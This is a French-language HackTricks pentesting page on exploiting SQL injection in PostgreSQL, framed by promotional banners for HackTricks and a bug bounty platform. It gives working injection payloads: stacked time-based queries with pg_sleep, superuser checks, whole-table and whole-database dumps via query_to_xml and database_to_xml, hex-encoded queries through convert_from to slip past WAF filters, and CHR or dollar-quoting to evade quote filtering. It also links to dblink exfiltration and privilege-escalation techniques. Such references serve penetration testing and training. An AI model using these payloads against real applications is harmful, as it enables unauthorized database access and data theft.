# Injection PostgreSQL

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce de prime de bug** : **inscrivez-vous** √† **Intigriti**, une **plateforme de prime de bug premium cr√©√©e par des pirates, pour les pirates** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) d√®s aujourd'hui et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}



**Cette page vise √† expliquer diff√©rentes astuces qui pourraient vous aider √† exploiter une injection SQL trouv√©e dans une base de donn√©es PostgreSQL et √† compl√©ter les astuces que vous pouvez trouver sur** [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

## Interaction r√©seau - √âl√©vation de privil√®ges, scanner de port, divulgation de la r√©ponse de d√©fi NTLM et exfiltration

**`dblink`** est un **module PostgreSQL** qui offre plusieurs options int√©ressantes du point de vue de l'attaquant. Il peut √™tre utilis√© pour **se connecter √† d'autres instances PostgreSQL** ou effectuer des **connexions TCP**.\
**Ces fonctionnalit√©s**, ainsi que la fonctionnalit√© **`COPY FROM`**, peuvent √™tre utilis√©es pour **√©lever les privil√®ges**, effectuer un **scan de port** ou r√©cup√©rer des **r√©ponses de d√©fi NTLM**.\
[**Vous pouvez lire ici comment effectuer ces attaques.**](network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.md)

### **Exemple d'exfiltration utilisant dblink et des objets volumineux**

Vous pouvez [**lire cet exemple**](dblink-lo\_import-data-exfiltration.md) pour voir un exemple de CTF de **comment charger des donn√©es dans des objets volumineux et ensuite exfiltrer le contenu des objets volumineux dans le nom d'utilisateur** de la fonction `dblink_connect`.

## Attaques PostgreSQL : Lecture/√©criture, RCE, √©l√©vation de privil√®ges

D√©couvrez comment compromettre l'h√¥te et √©lever les privil√®ges depuis PostgreSQL dans :

{% content-ref url="../../../network-services-pentesting/pentesting-postgresql.md" %}
[pentesting-postgresql.md](../../../network-services-pentesting/pentesting-postgresql.md)
{% endcontent-ref %}

## Contournement de WAF

### Fonctions de cha√Æne PostgreSQL

La manipulation de cha√Ænes peut vous aider √† **contourner les WAF ou autres restrictions**.\
[**Dans cette page** ](https://www.postgresqltutorial.com/postgresql-string-functions/)**, vous pouvez trouver quelques fonctions de cha√Ænes utiles.**

### Requ√™tes empil√©es

N'oubliez pas que PostgreSQL prend en charge les requ√™tes empil√©es, mais plusieurs applications g√©n√©reront une erreur si 2 r√©ponses sont renvoy√©es alors qu'une seule est attendue. Cependant, vous pouvez toujours abuser des requ√™tes empil√©es via l'injection de temps :
```
id=1; select pg_sleep(10);-- -
1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -
```
### Astuces XML

**query\_to\_xml**

Cette fonction renverra toutes les donn√©es au format XML dans un seul fichier. C'est id√©al si vous souhaitez d√©charger beaucoup de donn√©es en une seule ligne :
```sql
SELECT query_to_xml('select * from pg_user',true,true,'');
```
**database\_to\_xml**

Cette fonction permet de sauvegarder l'int√©gralit√© de la base de donn√©es au format XML en une seule ligne (faites attention si la base de donn√©es est tr√®s volumineuse, car cela pourrait entra√Æner une attaque par d√©ni de service (DoS) ou affecter votre propre client) :
```sql
SELECT database_to_xml(true,true,'');
```
### Cha√Ænes en hexad√©cimal

Si vous pouvez ex√©cuter des **requ√™tes** en les passant **√† l'int√©rieur d'une cha√Æne** (par exemple en utilisant la fonction **`query_to_xml`**), **vous pouvez utiliser la fonction convert\_from pour passer la cha√Æne en hexad√©cimal et contourner les filtres de cette mani√®re :**

{% code overflow="wrap" %}
```sql
select encode('select cast(string_agg(table_name, '','') as int) from information_schema.tables', 'hex'), convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573', 'UTF8');

# Bypass via stacked queries + error based + query_to_xml with hex
;select query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,'')-- -h

# Bypass via boolean + error based + query_to_xml with hex
1 or '1' = (query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,''))::text-- -
```
{% endcode %}

### Guillemets interdits

Si vous ne pouvez pas utiliser de guillemets pour votre payload, vous pouvez contourner cette restriction avec `CHR` pour les clauses de base (la concat√©nation de caract√®res ne fonctionne que pour les requ√™tes de base telles que SELECT, INSERT, DELETE, etc. Elle ne fonctionne pas pour toutes les instructions SQL) :
```
SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
```
Ou avec `$`. Ces requ√™tes renvoient les m√™mes r√©sultats :
```
SELECT 'hacktricks';
SELECT $$hacktricks$$;
SELECT $TAG$hacktricks$TAG$;
```
<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce de prime de bug**: **inscrivez-vous** √† **Intigriti**, une plateforme premium de prime de bug cr√©√©e par des hackers, pour les hackers ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) d√®s aujourd'hui et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
